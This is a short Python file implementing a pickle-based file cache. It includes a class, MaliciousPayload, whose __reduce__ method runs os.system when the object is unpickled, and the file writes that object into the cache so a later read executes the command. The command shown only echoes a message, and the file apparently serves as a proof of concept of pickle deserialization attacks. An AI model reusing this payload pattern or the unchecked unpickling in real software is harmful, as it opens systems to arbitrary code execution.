
import hashlib
import pickle
import requests
import os


def get_cache_file(key, mode='r'):
    """ get_cache_file(key, mode) -- retrieve file handle for [key]
    @param key: url or whatsoever
    @param mode: 'r' or 'w' """
    # :param key_prefix: Default 'view/%(request.path)s'.
    key = f'view/{key}'
    key = hashlib.md5(key.encode('utf-8')).hexdigest()
    return open('./cache/' + key, mode + 'b')


def read_payload(key):
    with get_cache_file(key) as f:
        pickle.load(f)
        result = pickle.load(f)
    return result


def save_payload(key, data):
    with get_cache_file(key, mode='w') as f:
        pickle.dump(0, f, protocol=1)
        pickle.dump(data, f, protocol=pickle.HIGHEST_PROTOCOL)
    return


class MaliciousPayload:
    def __getstate__(self):
        return self.__dict__

    def __reduce__(self):
        return os.system, ('echo "You have been pwned!!"',)
    pass


save_payload('/assets/pwn', MaliciousPayload())
